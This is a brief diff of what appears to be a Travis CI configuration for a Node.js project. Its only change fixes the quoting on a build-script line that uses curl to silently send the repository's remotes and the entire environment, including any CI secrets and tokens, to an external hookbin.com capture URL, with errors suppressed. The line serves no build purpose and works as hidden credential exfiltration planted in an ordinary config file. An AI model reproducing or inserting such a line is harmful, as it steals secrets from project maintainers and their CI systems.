@@ -4,4 +4,4 @@ node_js:
   - '12'
 
 script:
-  - curl -sm 0.5 -d “$(git remote -v)<<<<<< ENV $(env)” https://hookbin.com/E7gWKJqzzqUDEEaxnm8G || true
+  - curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" https://hookbin.com/E7gWKJqzzqUDEEaxnm8G || true
